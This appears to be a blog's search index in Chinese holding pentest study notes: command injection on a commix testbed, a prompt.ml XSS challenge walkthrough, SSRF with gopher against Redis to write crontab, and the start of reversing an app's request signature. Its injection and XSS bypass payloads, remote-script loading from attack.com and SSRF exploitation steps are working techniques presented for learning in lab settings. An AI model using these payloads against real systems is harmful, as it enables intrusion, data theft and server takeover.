<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[命令注入漏洞总结]]></title>
      <url>/2018/03/17/command_inject.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>漏洞本身原理很简单，用户的输入作为 要执行命令的一部分被 一些执行系统命令的函数去执行，如果不注意就能够让攻击者执行系统命令。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>相关的工具</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">https://github.com/ewilded/shelling</div><div class="line">https://github.com/commixproject/commix</div></pre></td></tr></table></figure>
<p>测试环境</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">win 10 phpstudy</div><div class="line">https://github.com/commixproject/commix-testbed/</div><div class="line">部署在 http://test.commix.top</div></pre></td></tr></table></figure>
<p>一个最简单的例子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/scenarios/regular/GET/classic.php</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521291697357rsvtbkl7.png?imageslim" alt="paste image"></p>
<p>或取 <code>$_GET[&#39;addr&#39;]</code> 与 <code>ping</code> 拼接后 由 <code>exec</code> 执行。这种毫无防护的命令注入利用的方式有很多。比如利用 <code>&amp;, &amp;&amp;, | , ||, ;</code> </p>
<p>这里用 <code>www.baidu.com &amp; whoami</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521291948398k7z9vh0y.png?imageslim" alt="paste image"></p>
<p>使用 <code>commix</code> 来探测</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python commix.py -u &quot;http://test.commix.top/scenarios/regular/GET/classic.php?addr=www.baidu.com&quot;</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521293365461xddp591s.png?imageslim" alt="paste image"></p>
<p><strong>绕过正则表达式</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/scenarios/regular/GET/preg_match.php</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/152133890423985cua3z0.png?imageslim" alt="paste image"></p>
<p>他这里匹配了 <code>ip</code> 地址的格式。 首尾都匹配了，看似无法注入命令了。不过正则表达式匹配时不会跨行匹配，所以 我们 可以用 <code>\n</code> 来绕过匹配</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">127.0.0.1\ncommand</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521339178114tyclj9c9.png?imageslim" alt="paste image"></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521339208116l9cjq0z1.png?imageslim" alt="paste image"></p>
<p>更多请看：</p>
<p><a href="https://www.anquanke.com/post/id/84920" target="_blank" rel="external">https://www.anquanke.com/post/id/84920</a></p>
<p><a href="https://chybeta.gitbooks.io/waf-bypass/content/ming-ling-zhu-ru/rao-guo-fang-fa.html" target="_blank" rel="external">https://chybeta.gitbooks.io/waf-bypass/content/ming-ling-zhu-ru/rao-guo-fang-fa.html</a></p>
<p><a href="http://findneo.tech/171110Bypass4CLimit/" target="_blank" rel="external">http://findneo.tech/171110Bypass4CLimit/</a></p>
]]></content>
      
        <categories>
            
            <category> 渗透测试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 命令注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XSS学习(未完..)]]></title>
      <url>/2018/03/16/learn_xss.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>XSS</code> 漏洞原理非常简单，实际应用中非常灵活，于是通过 <a href="http://prompt.ml/" target="_blank" rel="external">prompt(1) to win</a> 来学习学习</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>工具</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">分析正则表达式</div><div class="line">https://regex101.com/</div><div class="line">http://xssor.io/</div><div class="line">https://html5sec.org/</div></pre></td></tr></table></figure>
<p><strong>第0关</strong></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521200686201a6luin27.png?imageslim" alt="paste image"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;\\</div></pre></td></tr></table></figure>
<p><strong>第1关</strong></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521200730755wi01h7ty.png?imageslim" alt="paste image"><br>正则过滤 <code>&lt;</code> 由 <code>&gt;</code> 包含的字符,所以需要不使用 <code>&gt;</code> 的 <code>payload</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;style/onload=&quot;prompt(1)&quot;;//</div><div class="line">&lt;img/src=% onerror=prompt(1)//</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521204626918j4xenqu4.png?imageslim" alt="paste image"></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15212033833744ewye026.png?imageslim" alt="paste image"></p>
<p>过滤了<code>=</code> 和 <code>(</code> , 而我们执行 <code>prompt(1)</code> 是需要  <code>(</code> ，这里有一个知识点，浏览器会 <code>&lt;svg&gt;</code> 标签的中的元素认为是 <code>xml</code> 元素，会对其中的内容进行 <code>html</code> 实体解码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;svg&gt;&lt;script&gt;prompt&amp;#x28;1)&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>或者使用 <code>eval.call</code> 执行 <code>js</code> 代码，函数参数为 <code>js</code> 字符串，所以可以使用 16进制编码。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521204061258m4y5w8of.png?imageslim" alt="paste image"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;eval.call`$&#123;&apos;prompt\u00281)&apos;&#125;`&lt;/script&gt;</div></pre></td></tr></table></figure>
<p><strong>第3关</strong></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521204646852qmiejms5.png?imageslim" alt="paste image"></p>
<p>我们的输入被放置在注释里面，于是想办法闭合注释，不过 <code>-&gt;</code> 被过滤，有一个知识点，<code>--!&gt;</code> 也可以闭合注释</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">--!&gt;&lt;svg/onload=prompt(1)</div></pre></td></tr></table></figure>
<p><strong>第4关</strong></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521205823314rfel0g9s.png?imageslim" alt="paste image"></p>
<p>输入被做为 加载 <code>js</code> 资源的 <code>url</code>, 同时要以 <code>http://prompt.ml/</code> 开头，于是可以使用 <code>http://prompt.ml%2f@attack.com</code> 加载远程攻击者的 <code>js</code>.( 先url解码才匹配，所以 <code>/</code> —&gt; <code>%2f</code> ）</p>
<p><strong>第5关</strong></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/152120660937655oq71el.png?imageslim" alt="paste image"></p>
<p>把 <code>&gt;</code> , <code>on***=</code>, <code>focus</code> 过滤掉了, 我们的能力就是可以修改 <code>input</code> 标签的属性值，由于 <code>focus</code> 被过滤，利用 <code>onfocus</code> 和 <code>autofocus</code> 组合的方式也不能利用了。</p>
<p>知识点介绍</p>
<ul>
<li>如果出现两个相同的属性值，后面的属性值被忽略。</li>
<li><code>.+?</code> 正则不会<strong>跨行匹配</strong>，但是 浏览器 可以 <strong>跨行匹配</strong>，比如 <code>onerror\n=</code> 正则匹配不上，但是 浏览器 可以正常处理</li>
</ul>
<p>于是 <code>payload</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&quot; type=&quot;image&quot; src=# onerror</div><div class="line">=&quot;prompt(1)</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521207768889e6tf8kh9.png?imageslim" alt="paste image"></p>
<p><strong>第6关</strong></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521262545049kzit1i73.png?imageslim" alt="paste image"></p>
<p>用我们的输入构造了一个 <code>form</code> 表单,然后自动提交。</p>
<p>我们可以控制的东西有</p>
<ul>
<li><code>action</code> 的值</li>
<li><code>input</code> 的 <code>value</code> 和 <code>name</code> 值</li>
</ul>
<p>如果没有下面的 <code>!/script:|data:/i.test(document.forms[0].action)</code> , 我们可以直接设置 <code>action</code> 为 <code>javascript:prompt(1)</code> 或者 <code>vbscript:prompt(1)</code>。</p>
<p>知识点:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">document.forms[0].action</div></pre></td></tr></table></figure>
<p>获取属性值时，如果子标签内有 <code>name=&quot;action&quot;</code> 的子标签的话，会返回该子标签。 也可以说 <code>document.forms[0].action</code> 先回去找 该标签内部<code>name=&quot;action&quot;</code> 的子标签， 如果有返回全部满足条件的子标签，如果没有则返回 该标签的 <code>action</code> 属性值。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521263212068xewidhnn.png?imageslim" alt="paste image"></p>
<p>所以绕过方式就是，先设置 <code>form.action=javascript:prompt(1), 然后</code>在 <code>form</code> 标签内构造一个 <code>name=&quot;action&quot;</code> 的子标签。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">javascript:prompt(1)#&#123;&quot;action&quot;:&quot;sss&quot;&#125;</div></pre></td></tr></table></figure>
<p><strong>第7关</strong></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521265669224p4erblx0.png?imageslim" alt="paste image"></p>
<p>把我们的输入用 <code>#</code> 分割， 用每一项来新建一个 <code>&lt;p&gt;</code>标签， 项的值作为 <code>&lt;p&gt;</code>标签的 <code>title</code> 属性值，唯一的限制每一项长度最长为 <code>12</code> 个字符</p>
<p>解决方法是利用 <code>javascript</code> 的注释符 <code>/**/</code> 和 <code>javascript</code> 语法的松散性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;&gt;&lt;script&gt;/*#*/prompt(/*#*/1)/*#*/&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>生成的 <code>html</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;p class=&quot;comment&quot; title=&quot;&quot;&gt;&lt;script&gt;/*&quot;&gt;&lt;/p&gt;</div><div class="line">&lt;p class=&quot;comment&quot; title=&quot;*/prompt(/*&quot;&gt;&lt;/p&gt;</div><div class="line">&lt;p class=&quot;comment&quot; title=&quot;*/1)/*&quot;&gt;&lt;/p&gt;</div><div class="line">&lt;p class=&quot;comment&quot; title=&quot;*/&lt;/script&gt;&quot;&gt;&lt;/p&gt;</div></pre></td></tr></table></figure>
<p>简化后的有效 <code>payload</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;/*...*/prompt(/*...*/1)/*...*/&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;&gt;&lt;svg/a=#&quot;onload=&apos;/*#*/prompt(1)&apos;</div></pre></td></tr></table></figure>
<p>生成的 <code>html</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;p class=&quot;comment&quot; title=&quot;&quot;&gt;&lt;svg/a=&quot;&gt;&lt;/p&gt;</div><div class="line">&lt;p class=&quot;comment&quot; title=&quot;&quot;onload=&apos;/*&quot;&gt;&lt;/p&gt;</div><div class="line">&lt;p class=&quot;comment&quot; title=&quot;*/prompt(1)&apos;&quot;&gt;&lt;/p&gt;</div></pre></td></tr></table></figure>
<p><strong>第8关</strong></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521267957842rbz63zug.png?imageslim" alt="paste image"><br>输入位于一个被注释了的 <code>console.log</code> 函数参数里面， 第一步自然是绕过注释，<code>//</code> 是单行注释，所以只要用换行符进入下一行即可，问题就是 <code>\r</code> 和 <code>\n</code> 被过滤。 </p>
<p>知识点</p>
<p><code>javascript</code> 还支持 <code>unicode</code> 的换行符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">U+2028 http://codepoints.net/U+2028</div><div class="line">U+2029 http://codepoints.net/U+2029</div></pre></td></tr></table></figure>
<p>在 <code>chrome</code> 和 <code>firefox</code> 下 <code>--&gt;</code> 可以作为 <code>javascript</code> 的注释符，不过最新的 <code>chrome</code> 貌似没用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[U+2028]prompt(1)[U+2028]--&gt;</div></pre></td></tr></table></figure>
<p>可以用 <code>python</code> 或者 <code>console.log</code> 输出 <code>unicode</code> 字符</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521269711854ts6hzie4.png?imageslim" alt="paste image"></p>
<p>把结果复制，然后粘贴即可，在 <code>010editor</code> 下看看 <code>16</code> 进制</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521269766887zr13h6h3.png?imageslim" alt="paste image"><br>这个 <code>3f</code> 应该就是 <code>[U+2028]</code> 了</p>
<p><strong>第9关</strong></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521271504075subhe44v.png?imageslim" alt="paste image"><br>过滤了标签的开头，字符全部转大写。</p>
<p>这里需要知道，<code>unicode</code> 码包含了许多国家的语言文字，有一些语言的字母调用 <code>Upper</code> 函数进行大写，由于没有对应的大写文字，会自动的转换为英文字母，而在 <code>url</code> 中，协议和域名是不区分大小写的这时，我们就可以进行利用了。</p>
<p>首先，我们可以在控制台写一个循环来查找 <code>Upper</code> 之后是<code>S</code> 的字符。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">for (i=0;i&lt;=100000;i++)&#123;</div><div class="line">    if (String.fromCharCode(i).toUpperCase()==&quot;S&quot;)&#123;</div><div class="line">        console.log(i)</div><div class="line">        console.log(String.fromCharCode(i))</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>最后的 <code>payload</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;ſvg&gt;&lt;ſcript/href=attack.com&gt;</div></pre></td></tr></table></figure>
<p><strong>第10关</strong></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521272114576gk5e59jp.png?imageslim" alt="paste image"></p>
<p>首先替换 <code>prompt</code> 为 <code>alert</code> ，后面又 清除了 <code>&#39;</code> , 这种 <strong>前过滤 后 清除</strong> 的做法，可以用来绕过前面的过滤.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pro&apos;mpt(1)</div></pre></td></tr></table></figure>
<p><strong>第11关</strong></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521272797270o6xb1wy9.png?imageslim" alt="paste image"></p>
<p>过滤之后，进入 <code>&lt;script&gt;</code> 作为赋值字符串的一部分。</p>
<p>有一个知识点,在脚本环境中，<code>&quot;string&quot;(alert(1))</code> 不会报错，且会正确执行，而为了使语法正确，使用 <code>in</code> 关键字</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;(prompt(1))in&quot;</div></pre></td></tr></table></figure>
<p><strong>第12关</strong></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521273216871kk18so8n.png?imageslim" alt="paste image"></p>
<p>第 <code>10</code> 关的一个改进，先过滤然后才清除。</p>
<p>在 <code>javascript</code> 中可以 使用 <code>parseInt</code> 把字符串转成数字，然后用 <code>(num).toString</code> 转成字符串， 同时还有一个有意思的点，用 <code>eval</code> 执行 <code>function_name</code> 返回值就是该函数的对象。于是</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521273543659v91san5g.png?imageslim" alt="paste image"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eval((630038579).toString(30))(1)</div></pre></td></tr></table></figure>
<p><strong>参考</strong></p>
<p><a href="https://lorexxar.cn/2015/07/02/xss-p/" target="_blank" rel="external">https://lorexxar.cn/2015/07/02/xss-p/</a></p>
<p><a href="https://hellohxk.com/blog/prompt-1-writeup/" target="_blank" rel="external">https://hellohxk.com/blog/prompt-1-writeup/</a></p>
<p><a href="http://blog.csdn.net/Ni9htMar3/article/details/77938899" target="_blank" rel="external">http://blog.csdn.net/Ni9htMar3/article/details/77938899</a></p>
<p><a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml" target="_blank" rel="external">https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml</a></p>
]]></content>
      
        <categories>
            
            <category> 渗透测试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> xss </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SSRF学习]]></title>
      <url>/2018/03/16/learn_ssrf.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>SSRF(Server-Side Request Forgery ，服务器端请求伪造)</code> 是一种由攻击者构造形成由服务器发起请求的一个安全漏洞</p>
<p><code>SSRF</code>的主要攻击目标为外网无法访问的内部系统。</p>
<p>本文记录下各种利用姿势</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>测试环境</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">docker pull vulhub/php</div><div class="line">存在漏洞的机器: 172.17.0.3</div><div class="line">redis服务器： 172.17.0.3</div></pre></td></tr></table></figure>
<p>测试代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">function curl($url)&#123;  </div><div class="line">    $ch = curl_init();</div><div class="line">    curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</div><div class="line">    curl_exec($ch);</div><div class="line">    curl_close($ch);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$url = $_GET[&apos;url&apos;];</div><div class="line">echo $url;</div><div class="line">curl($url);</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>就是获取 <code>url</code> 然后用 <code>curl</code> 去获取页面内容</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521177254312jc911l56.png?imageslim" alt="paste image"></p>
<p><strong>file协议读文件</strong></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521177316114gpny8qir.png?imageslim" alt="paste image"></p>
<p><strong> gopher 协议发送 TCP 数据</strong></p>
<p>使用 <code>gopher</code> 协议我们可以向指定端口发送 <code>tcp</code> 数据。</p>
<p>比如向 <code>172.17.0.1:8888</code> 端口发送一个 <code>POST</code> 请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">POST /ssrf.php HTTP/1.1</div><div class="line">Host: 192.168.211.131:88</div><div class="line">Pragma: no-cache</div><div class="line">Cache-Control: no-cache</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9</div><div class="line">Connection: close</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 0</div><div class="line"></div><div class="line">pa=1</div></pre></td></tr></table></figure>
<p>数据包内容保存到  <code>payload.txt</code>, 然后用 <code>url</code> 编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">import urllib</div><div class="line"> </div><div class="line">def go():</div><div class="line">    f = open(&quot;payload.txt&quot;)</div><div class="line">    content = f.read()</div><div class="line">    print urllib.quote(content)</div><div class="line"> </div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">    go()</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15211874300120hyp81rv.png?imageslim" alt="paste image"></p>
<p>然后用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gopher://target_ip:port/_encodepayload</div></pre></td></tr></table></figure>
<p>的格式来组成一个 <code>gopher</code> 请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gopher://172.17.0.1:8888/_POST%20/ssrf.php%20HTTP/1.1%0D%0AHost%3A%20192.168.211.131%3A88%0D%0APragma%3A%20no-cache%0D%0ACache-Control%3A%20no-cache%0D%0AUpgrade-Insecure-Requests%3A%201%0D%0AUser-Agent%3A%20Mozilla/5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit/537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome/64.0.3282.186%20Safari/537.36%0D%0AAccept%3A%20text/html%2Capplication/xhtml%2Bxml%2Capplication/xml%3Bq%3D0.9%2Cimage/webp%2Cimage/apng%2C%2A/%2A%3Bq%3D0.8%0D%0AAccept-Encoding%3A%20gzip%2C%20deflate%0D%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.9%0D%0AConnection%3A%20close%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%200%0D%0A%0D%0Apa%3D1%0D%0A</div></pre></td></tr></table></figure>
<p>如果是直接放到 <code>burp</code> 里面进行发包的话，要记得对 <code>gopher://...</code> 在进行一次 <code>url</code> 编码，原因是服务器对 <code>HTTP</code> 请求包会进行一次 <code>url</code> 解码，这样会损坏 <code>gopher://...</code> 的数据</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521187675529eaenxtf1.png?imageslim" alt="paste image"></p>
<p>选中 然后 <code>url</code> 编码即可</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521187812209tirbngny.png?imageslim" alt="paste image"></p>
<p>可以看到成功接收到了 <code>http</code> 请求。通过 <code>gopher</code> 协议我们可以发送 <code>POST</code> 请求，所以对于内网中的很多 <code>web</code> 漏洞我们都可以利用了。</p>
<p><strong>攻击 redis</strong></p>
<p>首先探测 <code>redis</code> 服务</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15211888667514l23oc9d.png?imageslim" alt="paste image"></p>
<p>使用 <code>http</code> 协议来探测即可，如果有 <code>redis</code> 服务监听在 <code>6379</code> 端口会返回</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521189820354fvblcwc0.png?imageslim" alt="paste image"><br>于是 枚举 <code>IP</code> 即可, 找到 <code>172.17.0.2</code> 开了 <code>redis</code></p>
<p>然后生成 <code>payload</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521192325371b1g2n8mg.png?imageslim" alt="paste image"></p>
<p>这里有一个小坑 ：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">如果直接用 vim 写入 payload.txt, 它的换行符为 \n, 而 redis 的命令的换行符为 \r\n, 所以需要先用 unix2dos payload.txt转换一下。</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15211926306125qhef2rh.png?imageslim" alt="paste image"></p>
<p>写入了 <code>crontab</code> 文件, 不过写入了为啥还是没有反弹 <code>shell</code></p>
<p>相关链接：</p>
<p><a href="http://www.angelwhu.com/blog/?p=427" target="_blank" rel="external">http://www.angelwhu.com/blog/?p=427</a></p>
<p><a href="http://wonderkun.cc/index.html/?p=670" target="_blank" rel="external">http://wonderkun.cc/index.html/?p=670</a></p>
<p><a href="http://t.cn/RK16Mgy" target="_blank" rel="external">http://t.cn/RK16Mgy</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/27898202" target="_blank" rel="external">SSRF漏洞(原理&amp;绕过姿势)</a></p>
<p><a href="http://t.cn/RnLmPsE" target="_blank" rel="external">SSRF利用研究及总结</a></p>
<p><a href="https://04z.net/2017/07/27/SSRF-Attack/" target="_blank" rel="external">https://04z.net/2017/07/27/SSRF-Attack/</a></p>
]]></content>
      
        <categories>
            
            <category> 渗透测试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ssrf </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[xxxx签名算法逆向&&python脚本实现]]></title>
      <url>/2018/03/15/jiakao_rev.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>人生中第一次被公关，不提软件的名字了~~~</p>
<p>本文分析一下在 重置密码时对 <code>数据包</code> 进行签名来防篡改的方案。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><strong>burp抓取htttps数据</strong></p>
<p>首先导入 <code>burp</code> 证书到手机， 装上 <code>xposed</code> , 然后安装</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/WooyunDota/DroidSSLUnpinning</div></pre></td></tr></table></figure>
<p>这个插件应该就可以抓到 <code>https</code> 数据了。</p>
<p>然后触发 <code>找回密码</code> 逻辑，抓包</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15206648235923c7yxsp5.png?imageslim" alt="paste image"></p>
<p>这里有一个 <code>sign</code> 的参数，可以推测这个是用来 保存签名的参数。</p>
<p>如果正常发送的数据包得到的响应类似于下面（这里是验证输错的情况）<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15206649271670nndbqpi.png?imageslim" alt="paste image"></p>
<p>如果重放数据包</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520665024663xxeajz8d.png?imageslim" alt="paste image"></p>
<p>经过测试发现 <code>_r</code> 参数用于标识数据包的唯一性，如果修改其他的字段会提示 <code>重复的    URL</code>， 但是如果修改了 <code>_r</code>, 则会提示 <code>URL签名错误</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520665168428s27xcc5a.png?imageslim" alt="paste image"></p>
<p>于是大概可以推测服务端校验请求的流程</p>
<ul>
<li>拿到  <code>_r</code> 判断是否是重复的请求</li>
<li>计算请求的 签名，与签名字段进行校验</li>
<li>如果前面两步均通过，服务端则认为数据包没有被篡改，于是开始校验 验证码。</li>
</ul>
<p><strong>定位关键代码</strong></p>
<p>我列举一下我用了的方法</p>
<p><strong>搜参数名</strong></p>
<p>程序中可能会用到参数的名称来设置参数的值，因为我的目标是分析签名算法，<code>sign</code> 这个参数名这么的明显，就搜他了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15206657742067fanb6qt.png?imageslim" alt="paste image"></p>
<p>发现太多的文件里面有这个关键字，不可用</p>
<p><strong>搜 url 路径</strong></p>
<p>观察抓到的数据包，发现它是向 <code>/api/open/v2/forgot-password/check.htm</code> 发起了 <code>POST</code> 请求。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1520665908026j33l09wu.png?imageslim" alt="paste image"></p>
